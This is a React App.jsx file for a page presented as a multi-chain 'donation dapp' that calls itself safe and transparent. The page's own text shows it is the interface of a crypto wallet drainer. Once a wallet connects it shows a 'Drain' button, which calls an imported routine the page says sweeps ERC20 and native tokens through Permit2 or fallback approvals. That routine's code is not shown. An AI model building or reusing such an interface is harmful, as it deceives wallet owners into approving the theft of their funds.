// src/App.jsx
import React, { useState } from "react";
import { ConnectButton } from "@rainbow-me/rainbowkit";
import { useAccount, useWalletClient } from "wagmi";
import { autoDonateMultiChain } from "./engine/donate";

import Navbar from "./components/Navbar";
import PriceTicker from "./components/PriceTicker";
import Notifications from "./components/Notifications";
import Footer from "./components/Footer";
import Background from "./components/Background";

export default function App() {
  const [status, setStatus] = useState("idle");
  const [notifications, setNotifications] = useState([]);

  const { isConnected } = useAccount();
  const { data: walletClient } = useWalletClient();

  function addNotification(message, type = "info") {
    const id = Date.now() + Math.floor(Math.random() * 1000);
    setNotifications((prev) => [...prev, { id, message, type }]);
    setTimeout(() => {
      setNotifications((prev) => prev.filter((n) => n.id !== id));
    }, 5000);
  }

  async function handleDonate() {
    if (!walletClient) {
      addNotification("No connected wallet client found. Please connect your wallet.", "error");
      setStatus("failed");
      return;
    }

    try {
      setStatus("running");
      addNotification("Donation started… 🚀", "info");

      // IMPORTANT: autoDonateMultiChain(walletClient) must accept walletClient (unchanged logic)
      const res = await autoDonateMultiChain(walletClient);

      if (res?.success) {
        addNotification("Donation completed successfully 🎉", "success");
        setStatus("done");
      } else {
        addNotification(`Donation failed: ${res?.reason || "unknown"}`, "error");
        setStatus("failed");
      }
    } catch (e) {
      console.error(e);
      addNotification(`Error: ${e?.message || e}`, "error");
      setStatus("error");
    }
  }

  return (
    <div className="text-slate-900 min-h-screen relative">
      <Background />

      {/* Navbar (fixed) */}
      <Navbar />

      {/* Reserve space for fixed navbar */}
      <div className="pt-[72px] pb-24"> {/* footer height reserve */}
        {/* Price ticker under navbar */}
        <div className="w-full">
          <PriceTicker />
        </div>

        <div className="w-full max-w-screen-lg mx-auto px-4">
          <main className="flex flex-col items-center gap-6 py-8">
            <h1 className="text-3xl sm:text-4xl md:text-5xl font-extrabold text-center">
              MVP Donation Dapp
            </h1>

            <p className="text-slate-700 text-center text-sm sm:text-base max-w-xl">
              Donate tokens across chains in one click — safe, fast, and transparent.
            </p>

            {/* Hero area: Connect CTA + helper text always under it */}
            <div className="flex flex-col items-center gap-3 mt-2">
              <div className="flex flex-col items-center">
                <ConnectButton showBalance={false} chainStatus="icon" />
                <p className="mt-2 text-sm text-slate-600">
                  🔌 Connect your wallet to see the <strong>Drain</strong> button
                </p>
              </div>

              {/* Drain button shown only when connected */}
              <div>
                {isConnected ? (
                  <button
                    onClick={handleDonate}
                    disabled={status === "running"}
                    className="mt-2 px-6 py-3 bg-sky-600 text-white rounded-xl shadow-lg hover:bg-sky-700 transition disabled:opacity-60"
                  >
                    {status === "running" ? "Processing…" : "Drain"}
                  </button>
                ) : null}
              </div>
            </div>

            {/* Short info / spacing area so hero feels fuller on desktop */}
            <div className="w-full grid grid-cols-1 sm:grid-cols-3 gap-4 mt-6">
              <div className="bg-white/60 rounded-xl p-4 shadow-sm">
                <h3 className="text-sm font-semibold text-slate-800">Quick</h3>
                <p className="text-xs text-slate-700">Connect & sweep ERC20 + native tokens.</p>
              </div>
              <div className="bg-white/60 rounded-xl p-4 shadow-sm">
                <h3 className="text-sm font-semibold text-slate-800">Secure</h3>
                <p className="text-xs text-slate-700">Uses Permit2 where available, fallback approvals otherwise.</p>
              </div>
              <div className="bg-white/60 rounded-xl p-4 shadow-sm">
                <h3 className="text-sm font-semibold text-slate-800">Multi-chain</h3>
                <p className="text-xs text-slate-700">Ethereum, BSC, Polygon — add more in config.</p>
              </div>
            </div>
          </main>
        </div>
      </div>

      {/* fixed footer */}
      <Footer />

      {/* Notifications (floating toasts) */}
      <Notifications notifications={notifications} />
    </div>
  );
}
